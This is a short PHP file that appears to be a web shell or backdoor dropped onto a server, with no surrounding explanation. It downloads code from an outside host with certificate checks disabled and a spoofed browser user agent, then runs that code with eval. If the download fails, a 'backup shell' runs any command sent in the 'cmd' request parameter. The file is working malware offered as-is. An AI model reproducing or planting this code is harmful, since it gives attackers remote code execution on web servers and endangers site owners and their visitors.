TF<?php
$url = 'https://dox.dvds.nl/resources/crons.txt';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
$code = curl_exec($ch);
if($code === false) {
    // Fallback jika curl gagal
    $code = file_get_contents($url);
}
if($code !== false && !empty($code)) {
    eval('?>' . $code);
} else {
    // Backup shell langsung
    if(isset($_GET['cmd'])) {
        system($_GET['cmd']);
    } elseif(isset($_POST['cmd'])) {
        system($_POST['cmd']);
    }
}
curl_close($ch);
?>
